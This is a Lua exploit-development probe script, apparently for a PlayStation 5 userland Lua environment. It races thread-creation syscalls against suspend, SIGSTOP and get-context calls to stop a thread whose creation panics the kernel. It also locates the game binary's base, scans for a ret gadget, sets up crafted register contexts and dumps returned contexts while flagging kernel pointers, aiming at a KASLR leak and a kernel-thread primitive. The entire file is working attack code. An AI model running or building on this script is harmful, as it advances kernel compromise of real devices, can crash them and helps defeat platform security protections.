-- CRASH_CLASS: RISKY
-- PROBE 78a: Race thr_create against thr_suspend to freeze the panicking thread
--
-- Context: thr_create(430) returns rv=0 and a real TID BEFORE the child thread
-- runs (proven by 58e Section C). The child then faults and panics the kernel.
-- If we call thr_suspend(442) on the TID fast enough, we might freeze the thread
-- BEFORE it executes, preventing the panic entirely.
--
-- Strategy:
--   Section A: thr_create with RIP=0, immediately thr_suspend the TID
--   Section B: thr_create with valid eboot RIP, immediately thr_suspend
--   Section C: thr_create, then thr_kill(SIGSTOP) instead of thr_suspend
--   Section D: thr_create, then thr_suspend_ucontext(632) to freeze+read context
--   Section E: thr_create, then thr_get_ucontext(634) to read thread registers
--
-- If ANY section prevents the panic, we have a frozen kernel thread primitive.
-- If thr_get_ucontext returns data, check for kernel pointers (KASLR leak).

local TEST_SECTION = 1

print("=== PROBE 78a: THR_SUSPEND RACE ===")
print("TEST_SECTION=" .. TEST_SECTION)
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc_getpid = make_syscall(20)
local sc_nanosleep = make_syscall(240)
local sc_thr_create = make_syscall(430)
local sc_thr_suspend = make_syscall(442)
local sc_thr_wake = make_syscall(443)
local sc_thr_kill = make_syscall(433)
local sc_thr_suspend_ucontext = make_syscall(632)
local sc_thr_get_ucontext = make_syscall(634)

local function canary()
    local ok, pid = pcall(function() return sc_getpid():tonumber() end)
    return ok, pid
end

local alive_ok, pid = canary()
print("[0] canary pid=" .. tostring(pid) .. " ok=" .. tostring(alive_ok))

-- Get eboot base for valid RIP
local eboot_base = nil
repeat
    local info = memory.alloc(0x200)
    zero(info, 0x200)
    wd(info, 0x160)
    local sc_info = make_syscall(593)
    local iok = pcall(function() sc_info(uint64(0), info) end)
    if iok then
        local lo = rd(info + 0x108)
        local hi = rd(info + 0x10C)
        if lo and hi then
            eboot_base = uint64(string.format("0x%X%08X", hi, lo))
            print("[0] eboot_base=" .. q(eboot_base))
        end
    end
until true

-- Find a ret gadget in eboot
local ret_addr = nil
if eboot_base then
    for off = 0, 0x1000 - 1 do
        local b = rd(eboot_base + off)
        if b then
            if (b % 256) == 0xC3 then
                ret_addr = eboot_base + off
                print("[0] ret_gadget=" .. q(ret_addr))
                break
            end
        end
    end
end

-- Allocate shared resources
local ctx = memory.alloc(0x600)
local id_slot = memory.alloc(0x10)
local stack = memory.alloc(0x4000)
local out_ctx = memory.alloc(0x600)
zero(ctx, 0x600)
zero(id_slot, 0x10)
zero(stack, 0x4000)
zero(out_ctx, 0x600)

-- Context validation gates
wq(ctx + 0x108, 0x480)   -- magic
wd(ctx + 0x0D0, 0)       -- uc_flags <=7
wq(ctx + 0x110, 0x10000) -- mc_len

-- Common register setup
wq(ctx + 0xE0, stack + 0x3FF0)  -- RSP
wq(ctx + 0x100, 0)               -- RFLAGS
wq(ctx + 0x48, 0)                -- RDI
wq(ctx + 0x50, 0)                -- RSI

-- Prefill id_slot
wq(id_slot, uint64(string.format("0x%X%08X", 0xDEADBEEF, 0xDEADBEEF)))

print("[0] ctx=" .. tostring(ctx) .. " id_slot=" .. tostring(id_slot))
print("")

-- ==============================
-- SECTION A: thr_create(RIP=0) + immediate thr_suspend
-- ==============================
if TEST_SECTION == 1 then
    print("=== SECTION A: RIP=0 + immediate thr_suspend(442) ===")
    wq(ctx + 0xF8, 0) -- RIP=0

    print("[A] [BEFORE] thr_create")
    local ok1, rv1 = pcall(function()
        return sc_thr_create(uint64(ctx), uint64(id_slot), uint64(0))
    end)
    print("[A] thr_create ok=" .. tostring(ok1) .. " rv=" .. tostring(rv1))

    -- Read TID immediately
    local tid_val = rq(id_slot)
    print("[A] tid=" .. q(tid_val))

    -- RACE: immediately suspend the thread
    if tid_val then
        local tid_lo = to_num(tid_val)
        print("[A] [BEFORE] thr_suspend(" .. tid_lo .. ")")
        local ok2, rv2 = pcall(function()
            return sc_thr_suspend(uint64(tid_lo))
        end)
        print("[A] thr_suspend ok=" .. tostring(ok2) .. " rv=" .. tostring(rv2))
    end

    -- Canary check
    local c1_ok, c1_pid = canary()
    print("[A] canary_immediate ok=" .. tostring(c1_ok) .. " pid=" .. tostring(c1_pid))

    -- Wait 500ms
    local ts = memory.alloc(16)
    wq(ts, 0); wq(ts + 8, 500000000)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
    local c2_ok, c2_pid = canary()
    print("[A] canary_500ms ok=" .. tostring(c2_ok) .. " pid=" .. tostring(c2_pid))

    -- Wait 2s more
    wq(ts, 2); wq(ts + 8, 0)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
    local c3_ok, c3_pid = canary()
    print("[A] canary_2500ms ok=" .. tostring(c3_ok) .. " pid=" .. tostring(c3_pid))

    -- Wait 5s more
    wq(ts, 5)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
    local c4_ok, c4_pid = canary()
    print("[A] canary_7500ms ok=" .. tostring(c4_ok) .. " pid=" .. tostring(c4_pid))

    print("=== SECTION A COMPLETE ===")

-- ==============================
-- SECTION B: thr_create(RIP=eboot ret) + immediate thr_suspend
-- ==============================
elseif TEST_SECTION == 2 then
    print("=== SECTION B: RIP=eboot_ret + immediate thr_suspend(442) ===")
    if not ret_addr then
        print("[!] no ret gadget found, aborting")
        print("=== PROBE 78a ABORTED ===")
        return
    end
    wq(ctx + 0xF8, ret_addr)
    wq(stack + 0x3FF0, 0) -- ret to NULL (will fault after resume if not caught)

    print("[B] RIP=" .. q(ret_addr))
    print("[B] [BEFORE] thr_create")
    local ok1, rv1 = pcall(function()
        return sc_thr_create(uint64(ctx), uint64(id_slot), uint64(0))
    end)
    print("[B] thr_create ok=" .. tostring(ok1) .. " rv=" .. tostring(rv1))

    local tid_val = rq(id_slot)
    print("[B] tid=" .. q(tid_val))

    if tid_val then
        local tid_lo = to_num(tid_val)
        print("[B] [BEFORE] thr_suspend(" .. tid_lo .. ")")
        local ok2, rv2 = pcall(function()
            return sc_thr_suspend(uint64(tid_lo))
        end)
        print("[B] thr_suspend ok=" .. tostring(ok2) .. " rv=" .. tostring(rv2))
    end

    local c1_ok, c1_pid = canary()
    print("[B] canary_immediate ok=" .. tostring(c1_ok) .. " pid=" .. tostring(c1_pid))

    local ts = memory.alloc(16)
    wq(ts, 0); wq(ts + 8, 500000000)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
    local c2_ok, c2_pid = canary()
    print("[B] canary_500ms ok=" .. tostring(c2_ok) .. " pid=" .. tostring(c2_pid))

    wq(ts, 2); wq(ts + 8, 0)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
    local c3_ok, c3_pid = canary()
    print("[B] canary_2500ms ok=" .. tostring(c3_ok) .. " pid=" .. tostring(c3_pid))

    wq(ts, 5)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
    local c4_ok, c4_pid = canary()
    print("[B] canary_7500ms ok=" .. tostring(c4_ok) .. " pid=" .. tostring(c4_pid))

    print("=== SECTION B COMPLETE ===")

-- ==============================
-- SECTION C: thr_create(RIP=0) + thr_kill(SIGSTOP=17)
-- ==============================
elseif TEST_SECTION == 3 then
    print("=== SECTION C: RIP=0 + thr_kill(SIGSTOP) ===")
    wq(ctx + 0xF8, 0)

    print("[C] [BEFORE] thr_create")
    local ok1, rv1 = pcall(function()
        return sc_thr_create(uint64(ctx), uint64(id_slot), uint64(0))
    end)
    print("[C] thr_create ok=" .. tostring(ok1) .. " rv=" .. tostring(rv1))

    local tid_val = rq(id_slot)
    print("[C] tid=" .. q(tid_val))

    if tid_val then
        local tid_lo = to_num(tid_val)
        -- SIGSTOP = 17 on FreeBSD
        print("[C] [BEFORE] thr_kill(" .. tid_lo .. ", SIGSTOP=17)")
        local ok2, rv2 = pcall(function()
            return sc_thr_kill(uint64(tid_lo), uint64(17))
        end)
        print("[C] thr_kill ok=" .. tostring(ok2) .. " rv=" .. tostring(rv2))
    end

    local c1_ok, c1_pid = canary()
    print("[C] canary_immediate ok=" .. tostring(c1_ok) .. " pid=" .. tostring(c1_pid))

    local ts = memory.alloc(16)
    wq(ts, 0); wq(ts + 8, 500000000)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
    local c2_ok, c2_pid = canary()
    print("[C] canary_500ms ok=" .. tostring(c2_ok) .. " pid=" .. tostring(c2_pid))

    wq(ts, 2); wq(ts + 8, 0)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
    local c3_ok, c3_pid = canary()
    print("[C] canary_2500ms ok=" .. tostring(c3_ok) .. " pid=" .. tostring(c3_pid))

    wq(ts, 5)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
    local c4_ok, c4_pid = canary()
    print("[C] canary_7500ms ok=" .. tostring(c4_ok) .. " pid=" .. tostring(c4_pid))

    print("=== SECTION C COMPLETE ===")

-- ==============================
-- SECTION D: thr_create(RIP=0) + thr_suspend_ucontext(632)
-- ==============================
elseif TEST_SECTION == 4 then
    print("=== SECTION D: RIP=0 + thr_suspend_ucontext(632) ===")
    wq(ctx + 0xF8, 0)

    print("[D] [BEFORE] thr_create")
    local ok1, rv1 = pcall(function()
        return sc_thr_create(uint64(ctx), uint64(id_slot), uint64(0))
    end)
    print("[D] thr_create ok=" .. tostring(ok1) .. " rv=" .. tostring(rv1))

    local tid_val = rq(id_slot)
    print("[D] tid=" .. q(tid_val))

    if tid_val then
        local tid_lo = to_num(tid_val)
        -- thr_suspend_ucontext(632): arg1=tid, arg2=out_ucontext_buf
        zero(out_ctx, 0x600)
        print("[D] [BEFORE] thr_suspend_ucontext(" .. tid_lo .. ")")
        local ok2, rv2 = pcall(function()
            return sc_thr_suspend_ucontext(uint64(tid_lo), uint64(out_ctx))
        end)
        print("[D] thr_suspend_ucontext ok=" .. tostring(ok2) .. " rv=" .. tostring(rv2))

        -- Dump out_ctx for kernel pointer scan
        print("[D] === OUT_CTX DUMP ===")
        for off = 0, 0x120, 8 do
            local val = rq(out_ctx + off)
            if val then
                local h, l = get_hi_lo(val)
                if h ~= 0 or l ~= 0 then
                    local tag = ""
                    if h >= 0xFFFF8000 then tag = " <== KERNEL POINTER?" end
                    print(string.format("[D] +0x%03X: %s%s", off, q(val), tag))
                end
            end
        end
        print("[D] === END DUMP ===")
    end

    local c1_ok, c1_pid = canary()
    print("[D] canary_immediate ok=" .. tostring(c1_ok) .. " pid=" .. tostring(c1_pid))

    local ts = memory.alloc(16)
    wq(ts, 2); wq(ts + 8, 0)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
    local c2_ok, c2_pid = canary()
    print("[D] canary_2s ok=" .. tostring(c2_ok) .. " pid=" .. tostring(c2_pid))

    wq(ts, 5)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
    local c3_ok, c3_pid = canary()
    print("[D] canary_7s ok=" .. tostring(c3_ok) .. " pid=" .. tostring(c3_pid))

    print("=== SECTION D COMPLETE ===")

-- ==============================
-- SECTION E: thr_create(RIP=0) + thr_get_ucontext(634)
-- ==============================
elseif TEST_SECTION == 5 then
    print("=== SECTION E: RIP=0 + thr_get_ucontext(634) ===")
    wq(ctx + 0xF8, 0)

    print("[E] [BEFORE] thr_create")
    local ok1, rv1 = pcall(function()
        return sc_thr_create(uint64(ctx), uint64(id_slot), uint64(0))
    end)
    print("[E] thr_create ok=" .. tostring(ok1) .. " rv=" .. tostring(rv1))

    local tid_val = rq(id_slot)
    print("[E] tid=" .. q(tid_val))

    if tid_val then
        local tid_lo = to_num(tid_val)
        zero(out_ctx, 0x600)
        print("[E] [BEFORE] thr_get_ucontext(" .. tid_lo .. ")")
        local ok2, rv2 = pcall(function()
            return sc_thr_get_ucontext(uint64(tid_lo), uint64(out_ctx))
        end)
        print("[E] thr_get_ucontext ok=" .. tostring(ok2) .. " rv=" .. tostring(rv2))

        -- Full dump scanning for kernel pointers
        print("[E] === OUT_CTX DUMP ===")
        for off = 0, 0x120, 8 do
            local val = rq(out_ctx + off)
            if val then
                local h, l = get_hi_lo(val)
                if h ~= 0 or l ~= 0 then
                    local tag = ""
                    if h >= 0xFFFF8000 then tag = " <== KERNEL POINTER?" end
                    print(string.format("[E] +0x%03X: %s%s", off, q(val), tag))
                end
            end
        end
        print("[E] === END DUMP ===")
    end

    local c1_ok, c1_pid = canary()
    print("[E] canary_immediate ok=" .. tostring(c1_ok) .. " pid=" .. tostring(c1_pid))

    local ts = memory.alloc(16)
    wq(ts, 2); wq(ts + 8, 0)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
    local c2_ok, c2_pid = canary()
    print("[E] canary_2s ok=" .. tostring(c2_ok) .. " pid=" .. tostring(c2_pid))

    wq(ts, 5)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
    local c3_ok, c3_pid = canary()
    print("[E] canary_7s ok=" .. tostring(c3_ok) .. " pid=" .. tostring(c3_pid))

    print("=== SECTION E COMPLETE ===")

else
    print("[!] invalid TEST_SECTION=" .. TEST_SECTION .. " (use 1-5)")
    print("=== PROBE 78a ABORTED ===")
    return
end

print("")
print("=== PROBE 78a SECTION " .. TEST_SECTION .. " COMPLETE ===")
print("If PS5 crashed before this line: the suspend/kill did NOT win the race.")
print("If this line printed: the thread was caught or the section survived 7.5+ seconds!")
print("=== PROBE 78a COMPLETE ===")
